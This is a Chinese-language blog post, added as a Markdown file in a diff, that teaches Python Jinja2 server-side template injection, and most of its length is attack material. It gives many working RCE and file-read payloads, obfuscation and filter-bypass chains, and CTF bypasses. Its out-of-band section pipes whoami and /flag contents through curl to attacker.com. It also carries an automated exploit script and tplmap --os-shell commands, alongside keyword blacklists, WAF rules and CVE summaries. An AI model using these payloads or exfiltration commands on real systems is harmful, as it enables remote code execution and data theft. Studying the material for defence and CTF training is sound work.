@@ -1,0 +1,751 @@
+---
+title: 'Python SSTI 漏洞完全指南'
+description: '全面介绍 Python SSTI 漏洞的成因、利用技术及防护措施，帮助开发者深入理解并有效防范该类安全风险'
+pubDate: 2025-11-12
+author: '神林'
+cover: assets/cover.png
+recommend: true
+tags: ['Python', 'SSTI']
+---
+
+
+## 一、什么是 SSTI？
+
+**SSTI（Server Side Template Injection，服务器端模板注入）** 是一种Web安全漏洞，攻击者通过向模板引擎注入恶意代码，使服务器端执行非预期的操作。
+
+模板引擎在Web开发中用于将用户界面和业务数据分离，使逻辑代码和业务代码分离，提高代码复用性和开发效率。服务器端使用模板引擎对数据进行渲染，再传递给用户，可以针对特定用户/特定参数生成相应的页面。
+
+## 二、Python Flask 和 Jinja2 基础
+
+### Flask 框架简介
+
+Flask 是 Python 中的轻量级Web应用框架，使用 **Jinja2** 作为模板引擎。
+
+#### Flask 快速搭建
+
+Bash
+
+```
+# 安装虚拟环境
+pip install virtualenv
+# 生成虚拟环境
+virtualenv venv
+# 激活环境
+./venv/Scripts/activate.bat
+# 安装Flask
+pip install flask
+```
+
+#### 基础示例代码
+
+Python
+
+```
+from flask import Flask
+app = Flask(__name__)
+
+@app.route('/')
+def hello_world():
+    return 'Hello World!'
+
+if __name__ == '__main__':
+    app.run()
+```
+
+### Jinja2 模板语法
+
+Jinja2 支持以下语法进行数据渲染：
+
+* ​**`{{}}`**​：将花括号内的内容作为表达式执行并返回结果
+
+Python
+
+```
+{{3*4}}  # 会被解析为12
+```
+
+* ​**`{%%}`**​：用于声明变量或条件/循环语句
+
+Python
+
+```
+{% set s = 'Tuzk1' %}  # 声明变量
+{% if var is true %}Tuzk1{%endif%}  # 条件语句
+{% for i in range(3) %}Tuzk1{%endfor%}  # 循环语句
+```
+
+* ​**`{##}`**​：注释
+
+## 三、SSTI 漏洞成因
+
+### 漏洞产生原理
+
+SSTI 漏洞的根本原因是：​**服务器端将用户可控的输入直接拼接到模板中进行渲染**​，导致恶意代码被执行。
+
+### 代码对比分析
+
+#### 存在漏洞的代码
+
+Python
+
+```
+from flask import Flask, request, render_template_string
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    name = request.args.get('name', default='guest')
+    t = '''
+        <html>
+            <h1>Hello %s</h1>
+        </html>
+        ''' % (name)
+    # 将拼接后的字符串作为模板进行渲染
+    return render_template_string(t)
+
+app.run()
+```
+
+当传入 `{{10-1}}` 作为参数时，表达式会被执行，这就是 SSTI 漏洞的特征。
+
+#### 安全的代码
+
+Python
+
+```
+from flask import Flask, request, render_template
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    name = request.args.get('name', default='guest')
+    # 先渲染模板，再拼接字符串
+    return render_template('index.html', name=name)
+
+app.run()
+```
+
+​**关键区别**​：`render_template` 会对字符串进行​**自动转义**​，而 `render_template_string` 不会自动转义用户拼接的内容。
+
+## 四、漏洞利用技术
+
+### 利用思路
+
+基本的 RCE（远程代码执行）利用思路：
+
+1. 找一个内置类（如 `[]`、`""`）
+2. 通过该类获取到 `object` 类
+3. 通过 `object` 类获取所有子类
+4. 在子类列表中找到可利用的类
+5. 调用类下面的函数或使用该类空间下的其他模块
+
+### 常用魔术方法
+
+| **魔术方法**   | **作用**                       |
+| ---------------------- | -------------------------------------- |
+| `__class__`      | 返回对象所属的类                     |
+| `__base__`       | 获取类的直接父类                     |
+| `__bases__`      | 获取父类的元组                       |
+| `__mro__`        | 返回类的调用顺序                     |
+| `__subclasses__` | 返回所有子类列表                     |
+| `__globals__`    | 获取函数所属空间下的模块、方法及变量 |
+| `__builtins__`   | 返回Python内置函数                   |
+| `__import__`     | 用于导入模块                         |
+
+### 寻找可利用类
+
+Python
+
+```
+# 获取对象所属的类
+''.__class__  # <class 'str'>
+
+# 获取父类
+''.__class__.__base__  # <class 'object'>
+
+# 获取所有子类
+''.__class__.__base__.__subclasses__()
+```
+
+可利用的类包括：
+
+* `linecache`
+* `os._wrap_close`
+* `subprocess.Popen`
+* `warnings.catch_warnings`
+
+### 常见 Payload 构造
+
+#### RCE 执行命令
+
+Python
+
+```
+# 利用 warnings.catch_warnings 配合 __builtins__ 得到 eval 函数
+{{[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}
+
+# 利用 os._wrap_close 类
+{{"".__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}
+
+# 利用 subprocess.Popen 类
+{{''.__class__.__base__.__subclasses__()[479]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
+```
+
+#### 文件读写
+
+Python
+
+```
+# Python2 利用 file 类读文件
+{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
+
+# 通用文件读取
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__=='catch_warnings' %}
+{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}
+{% endif %}{% endfor %}
+```
+
+### 高级 Payload 构造技巧
+
+#### 1. 利用 attr 过滤器绕过沙箱
+
+最新的 **CVE-2025-27516** 揭示了 Jinja2 沙箱的一个重要绕过技术：^[7](https://nvd.nist.gov/vuln/detail/CVE-2025-27516#:~:text=Jinja%27s%20sandbox,in%203.1.6.)^^[8](https://www.cvedetails.com/cve/CVE-2025-27516/#:~:text=Jinja%27s%20sandbox,in%203.1.6.)^
+
+Python
+
+```
+# 传统沙箱会拦截 str.format 调用
+# 但可以使用 |attr 过滤器获取 format 方法的引用
+{{ ''|attr('format')('Hello {}', 'World') }}
+
+# 利用 attr 绕过沙箱执行命令
+{{ ''|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(128)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('whoami')|attr('read')() }}
+```
+
+#### 2. 利用 format 方法的高级技巧
+
+**CVE-2024-56326** 展示了存储恶意字符串 format 方法引用的技术：^[3](https://www.cvedetails.com/cve/CVE-2024-56326/#:~:text=Jinja%27s%20sandbox,calls%20it.)^
+
+Python
+
+```
+# 存储恶意 format 方法引用
+{% set evil = '{0.__init__.__globals__[__builtins__][__import__]("os").system("whoami")}'.__format__ %}
+# 通过过滤器调用
+{{ evil(''.__class__.__base__.__subclasses__()[128]) }}
+```
+
+#### 3. 文件名和内容双重控制利用
+
+**CVE-2024-56201** 揭示了当攻击者同时控制模板内容和文件名时的利用方式：^[2](https://nvd.nist.gov/vuln/detail/cve-2024-56201#:~:text=Jinja%20is,is%20used.)^
+
+Python
+
+```
+# 通过控制文件名注入代码
+# 文件名: ../../../{{7*7}}.html
+# 内容: 恶意模板代码
+{% include request.args.file %}  # 可导致任意代码执行
+```
+
+### 混淆和编码技巧
+
+#### 1. 字符串拼接混淆
+
+Python
+
+```
+# 使用波浪号(~)连接字符串
+{% set a = 'po' %}
+{% set b = 'pen' %}
+{{ ''.__class__.__base__.__subclasses__()[128].__init__.__globals__[a~b]('whoami').read() }}
+
+# 使用 join 拼接
+{% set cmd = ['ca','t',' ','/f','lag']|join %}
+{{ ''.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen(cmd).read() }}
+```
+
+#### 2. 字符编码绕过
+
+Python
+
+```
+# 十六进制编码
+{% set cmd = '\x77\x68\x6f\x61\x6d\x69' %}  # whoami
+
+# 八进制编码
+{% set cmd = '\167\150\157\141\155\151' %}  # whoami
+
+# Unicode 编码绕过关键字检测
+{{ ''['\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f'] }}  # __class__
+```
+
+#### 3. 数字和字符转换
+
+Python
+
+```
+# 使用 chr 函数构造字符串
+{% set chr = ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
+{% set cmd = chr(119)~chr(104)~chr(111)~chr(97)~chr(109)~chr(105) %}  # whoami
+{{ ''.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen(cmd).read() }}
+```
+
+### 深度绕过技术
+
+#### 1. 利用 lipsum 对象
+
+Python
+
+```
+# lipsum 是 Jinja2 内置的生成假文本的函数
+# 可以通过它获取 __globals__
+{{ lipsum.__globals__['os'].popen('whoami').read() }}
+{{ lipsum.__globals__.__builtins__.open('/etc/passwd').read() }}
+```
+
+#### 2. 利用 cycler 对象
+
+Python
+
+```
+# cycler 用于循环迭代
+{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
+{{ cycler.__init__.__globals__.__builtins__.eval("__import__('os').system('whoami')") }}
+```
+
+#### 3. 利用 joiner 对象
+
+Python
+
+```
+# joiner 用于连接字符串
+{{ joiner.__init__.__globals__.os.popen('whoami').read() }}
+```
+
+### 沙箱逃逸技术
+
+#### 1. 利用内置过滤器
+
+Python
+
+```
+# 利用 map 过滤器
+{{ ''.__class__.__base__.__subclasses__()|map(attribute='__init__')|map(attribute='__globals__')|list|map(attribute='popen')|list }}
+
+# 利用 select 和 reject 过滤器
+{{ ().__class__.__base__.__subclasses__()|select('equalto', 'Popen')|list }}
+```
+
+#### 2. 利用 namespace 对象
+
+Python
+
+```
+# 创建命名空间对象绕过限制
+{% set ns = namespace(a='__cla', b='ss__') %}
+{{ ''|attr(ns.a~ns.b) }}  # 等同于 ''.__class__
+```
+
+#### 3. 利用 with 语句
+
+Python
+
+```
+# 使用 with 语句创建上下文
+{% with %}
+  {% set cmd = 'whoami' %}
+  {{ ''.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen(cmd).read() }}
+{% endwith %}
+```
+
+### 盲注和外带技术
+
+#### 1. 基于时间的盲注
+
+Python
+
+```
+# 使用 sleep 延迟
+{% if ''.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('sleep 5').read() %}{% endif %}
+
+# 条件判断配合延迟
+{% if config.SECRET_KEY[0] == 'a' %}
+  {% for i in range(10000000) %}{% endfor %}
+{% endif %}
+```
+
+#### 2. DNS 外带
+
+Python
+
+```
+# 将数据通过 DNS 请求外带
+{{ ''.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('curl http://$(whoami).attacker.com/').read() }}
+
+# Base64 编码外带
+{{ ''.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('curl http://attacker.com/$(cat /flag | base64 -w0)').read() }}
+```
+
+#### 3. 错误信息外带
+
+Python
+
+```
+# 触发错误显示敏感信息
+{{ ''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('1/0') }}
+
+# 利用异常信息
+{{ undefined.variable[config.SECRET_KEY] }}
+```
+
+### 特殊环境下的利用
+
+#### 1. Docker 环境利用
+
+根据 ​**CVE-2025-23211**​，在 Docker Compose 环境中可能以 root 权限执行：^[1](https://www.cvedetails.com/cve/CVE-2025-23211/#:~:text=Tandoor%20Recipes,in%201.5.24.)^
+
+Python
+
+```
+# 检测是否在容器中
+{{ ''.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('cat /proc/1/cgroup').read() }}
+
+# 容器逃逸尝试
+{{ ''.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('fdisk -l').read() }}
+```
+
+#### 2. 受限环境突破
+
+Python
+
+```
+# 当 __builtins__ 被删除时
+{% for c in [].__class__.__base__.__subclasses__() %}
+  {% if c.__name__ == 'catch_warnings' %}
+    {% for b in c.__init__.__globals__.values() %}
+      {% if b.__class__ == {}.__class__ %}
+        {% if 'eval' in b.keys() %}
+          {{ b['eval']('__import__("os").popen("whoami").read()') }}
+        {% endif %}
+      {% endif %}
+    {% endfor %}
+  {% endif %}
+{% endfor %}
+```
+
+## 五、CTF 中的绕过技巧
+
+### 过滤单双引号
+
+Python
+
+```
+# 通过 request 传参绕过
+{{"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen(request.values.rce).read()}}&rce=cat /flag
+
+# 使用 chr 函数拼接字符串
+{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
+```
+
+### 过滤中括号
+
+Python
+
+```
+# 使用 __getitem__() 和 pop() 绕过
+"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen('whoami').read()
+```
+
+### 过滤双下划线
+
+Python
+
+```
+# request 传参绕过
+{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read()}}
+&class=__class__&mro=__mro__&subclasses=__subclasses__
+```
+
+### 过滤双花括号
+
+Python
+
+```
+# 使用 {% print %} 绕过
+{%print(''.__class__.__base__.__subclasses__()[138].__init__.__globals__.popen('whoami').read())%}
+```
+
+### 综合绕过示例
+
+过滤引号、中括号、下划线、花括号的情况：
+
+Python
+
+```
+# 使用 getlist 和 attr 组合绕过
+{%print(flask|attr(request.args.getlist(request.args.l1)|join)|attr(request.args.getlist(request.args.l2)|join)|attr(request.args.getlist(request.args.l3)|join)()|attr(request.args.getlist(request.args.l4)|join)(138)|attr(request.args.getlist(request.args.l5)|join)|attr(request.args.getlist(request.args.l6)|join)).popen(request.args.rce).read()%}
+&l1=a&a=_&a=_&a=class&a=_&a=_
+&l2=b&b=_&b=_&b=base&b=_&b=_
+&l3=c&c=_&c=_&c=subclasses&c=_&c=_
+&l4=d&d=_&d=_&d=getitem&d=_&d=_
+&l5=e&e=_&e=_&e=init&e=_&e=_
+&l6=f&f=_&f=_&f=globals&f=_&f=_
+&rce=whoami
+```
+
+### 防御绕过总结
+
+| **过滤内容** | **绕过方法**               | **示例**               |
+| -------------------- | ---------------------------------- | ------------------------------ |
+| 双下划线 `__`  | request 参数、attr 过滤器、编码  | `request.args.class`、\` |
+| 中括号 `[]`    | `__getitem__()`、`pop()` | `.__getitem__(0)`        |
+| 引号               | request 参数、chr 函数           | `request.values.cmd`     |
+| 花括号 `{{`    | `{% print %}`                | `{%print(payload)%}`     |
+| 关键字             | 拼接、编码、混淆                 | 字符串连接、hex/unicode 编码 |
+| 点号 `.`       | \`                               | attr()\` 过滤器              |
+
+## 六、防御措施
+
+### 1. 代码层面防御
+
+**安全的模板渲染实践**
+
+Python
+
+```
+# 使用沙箱环境
+from jinja2 import Environment, FileSystemLoader, select_autoescape
+from jinja2.sandbox import SandboxedEnvironment
+
+# 创建沙箱环境
+env = SandboxedEnvironment(
+    loader=FileSystemLoader('templates'),
+    autoescape=select_autoescape(['html', 'xml'])
+)
+
+# 禁用危险函数
+env.globals = {}
+env.filters = {}
+```
+
+### 2. 输入验证增强
+
+Python
+
+```
+import re
+
+def validate_template_input(user_input):
+    # 黑名单过滤
+    blacklist = [
+        '__class__', '__base__', '__subclasses__',
+        '__globals__', '__import__', 'eval', 'exec',
+        'os', 'subprocess', 'open', 'file'
+    ]
+
+    for keyword in blacklist:
+        if keyword in user_input:
+            raise ValueError(f"Forbidden keyword: {keyword}")
+
+    # 正则表达式检测
+    dangerous_patterns = [
+        r'\{\{.*\}\}',  # Jinja2 表达式
+        r'\{%.*%\}',    # Jinja2 语句
+        r'__\w+__',     # 双下划线方法
+    ]
+
+    for pattern in dangerous_patterns:
+        if re.search(pattern, user_input):
+            raise ValueError("Potentially dangerous pattern detected")
+
+    return user_input
+```
+
+### 3. WAF 规则配置
+
+Plaintext
+
+```
+# Nginx WAF 规则示例
+location / {
+    # 检测 SSTI 特征
+    if ($args ~* "(__class__|__base__|__subclasses__|__import__|eval|exec)") {
+        return 403;
+    }
+
+    if ($request_body ~* "(\{\{|\{%|__\w+__)") {
+        return 403;
+    }
+}
+```
+
+### 4. 深度防御策略
+
+1. ​**避免直接拼接用户输入**​：先渲染模板，再处理用户输入
+2. ​**使用安全的渲染函数**​：使用 `render_template` 而非 `render_template_string`
+3. ​**输入验证和过滤**​：对用户输入进行严格的验证和过滤
+4. ​**最小权限原则**​：限制模板引擎的执行权限
+5. ​**使用沙箱环境**​：在受限的环境中执行模板渲染
+
+## 七、真实世界的 SSTI 漏洞案例
+
+### 近期 CVE 漏洞
+
+以下是一些真实存在的 SSTI 漏洞案例，展示了该漏洞在实际应用中的危害：
+
+**CVE-2025-49619** - Skyvern SSTI 漏洞^[13](https://www.cvedetails.com/cve/CVE-2025-49619/#:~:text=CVE-2025-49619%20%3A,v2%20Block.)^^[12](https://nvd.nist.gov/vuln/detail/CVE-2025-49619#:~:text=Skyvern%20through,v2%20Block.)^
+
+* 影响版本：Skyvern 0.1.85 及之前版本
+* 漏洞位置：工作流块（如 Navigation v2 Block）的 Prompt 字段
+* 危害：攻击者可通过注入恶意模板代码执行任意命令
+
+**CVE-2025-25362** - Spacy-LLM SSTI 漏洞^[5](https://www.cvedetails.com/cve/CVE-2025-25362/#:~:text=A%20Server-Side,template%20field.)^
+
+* 影响版本：Spacy-LLM v0.7.2
+* 漏洞原理：模板字段未正确过滤用户输入
+* 利用方式：通过注入精心构造的 payload 到模板字段实现任意代码执行
+
+**CVE-2024-22722** - Form Tools SSTI 漏洞^[4](https://www.cvedetails.com/cve/CVE-2024-22722/#:~:text=Server%20Side,the%20application.)^
+
+* 影响版本：Form Tools 3.1.1
+* 漏洞位置：添加表单部分的 Group Name 字段
+* 危害：允许攻击者运行任意命令
+
+**CVE-2024-32651** - changedetection.io SSTI 漏洞^[11](https://www.cvedetails.com/cve/CVE-2024-32651/#:~:text=There%20is,reverse%20shell.)^^[6](https://nvd.nist.gov/vuln/detail/CVE-2024-32651#:~:text=There%20is,server%20machine.)^
+
+* 影响组件：changedetection.io
+* 漏洞类型：Jinja2 中的服务器端模板注入
+* 危害：允许远程命令执行，攻击者可以运行任何系统命令并使用反向shell
+
+## 八、其他模板引擎的 SSTI
+
+虽然本文主要讨论 Python 的 Jinja2，但 SSTI 漏洞广泛存在于各种模板引擎中：
+
+### Twig 模板引擎（PHP）
+
+Twig 是 PHP 中常用的模板引擎，在 WordPress 插件中经常出现 SSTI 漏洞：^[9](https://www.csoonline.com/article/3497490/critical-plugin-flaw-opens-over-a-million-wordpress-sites-to-rce-attacks.html#:~:text=%E2%80%9CSpecifically%2C%20the,injection%20%28SSTI%29.%E2%80%9D)^^[10](https://thehackernews.com/2024/08/critical-wpml-plugin-flaw-exposes.html#:~:text=%22Specifically%2C%20the,researcher%20said.)^
+
+* ​**WPML 插件漏洞**​：影响超过百万 WordPress 网站，由于未正确清理输入导致 SSTI
+* 漏洞原理：插件使用 Twig 模板渲染短代码内容，但未能正确清理输入
+
+### 跨语言 SSTI 检测方法
+
+Python
+
+```
+# 通用检测 payload（适用于多种模板引擎）
+{{7*7}}          # 预期输出：49
+${7*7}           # 预期输出：49
+<%= 7*7 %>       # 预期输出：49
+${{7*7}}         # 预期输出：49
+#{7*7}           # 预期输出：49
+```
+
+## 九、高级利用技术
+
+### 自动化利用工具
+
+**tplmap** - 自动化 SSTI 检测和利用工具
+
+Bash
+
+```
+# 安装
+git clone https://github.com/epinna/tplmap
+cd tplmap
+
+# 基本使用
+python tplmap.py -u "http://target.com/page?name=*"
+
+# 指定模板引擎
+python tplmap.py -u "http://target.com/page?name=*" -e Jinja2
+
+# 执行系统命令
+python tplmap.py -u "http://target.com/page?name=*" --os-shell
+```
+
+### 自动化利用脚本
+
+Python
+
+```
+#!/usr/bin/env python3
+# SSTI 自动化利用脚本
+
+import requests
+import sys
+
+class SSTIExploiter:
+    def __init__(self, url):
+        self.url = url
+        self.payloads = {
+            'basic': "{{7*7}}",
+            'rce': "{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('COMMAND').read()}}",
+            'lipsum': "{{lipsum.__globals__['os'].popen('COMMAND').read()}}",
+            'attr': "{{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(128)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('COMMAND')|attr('read')()}}",
+        }
+
+    def test_vulnerability(self):
+        """测试是否存在 SSTI 漏洞"""
+        test_payload = self.payloads['basic']
+        response = requests.get(self.url, params={'input': test_payload})
+        if '49' in response.text:
+            print("[+] SSTI vulnerability detected!")
+            return True
+        return False
+
+    def execute_command(self, command, method='rce'):
+        """执行系统命令"""
+        payload = self.payloads[method].replace('COMMAND', command)
+        response = requests.get(self.url, params={'input': payload})
+        return response.text
+
+    def find_subclass_index(self, class_name):
+        """查找特定子类的索引"""
+        payload = "{{''.__class__.__base__.__subclasses__()}}"
+        response = requests.get(self.url, params={'input': payload})
+        # 解析响应找到目标类的索引
+        if class_name in response.text:
+            # 实现索引查找逻辑
+            pass
+
+if __name__ == "__main__":
+    exploiter = SSTIExploiter(sys.argv[1])
+    if exploiter.test_vulnerability():
+        result = exploiter.execute_command('id')
+        print(result)
+```
+
+## 十、漏洞挖掘方法论
+
+### 1. 黑盒测试流程
+
+1. **识别模板引擎**
+   * 发送数学表达式：`{{7*7}}`、`${7*7}`
+   * 发送错误触发 payload：`{{7*'7'}}`
+   * 观察错误信息判断引擎类型
+2. **确认漏洞存在**
+   * 测试基础运算
+   * 测试字符串操作
+   * 测试函数调用
+3. **逐步提升权限**
+   * 获取类和方法
+   * 寻找危险函数
+   * 构造 RCE payload
+
+### 2. 代码审计要点
+
+重点关注以下代码模式：
+
+* `render_template_string()` 的使用
+* 用户输入直接拼接到模板
+* 动态模板生成
+* 自定义模板过滤器和函数
+
+## 总结
+
+Python SSTI 漏洞是 CTF 比赛中的常见题型，理解其原理和利用方法对于网络安全学习至关重要。掌握各种绕过技巧能够帮助在实战中灵活应对不同的过滤规则。同时，了解这些攻击手法也有助于在开发中避免此类安全问题。
+
+这些高级技术展示了 SSTI 漏洞利用的复杂性和多样性，同时也强调了在开发中实施多层防御的重要性。通过深入理解 SSTI 的原理、利用技术和防御措施，我们可以更好地保护 Web 应用免受此类攻击。
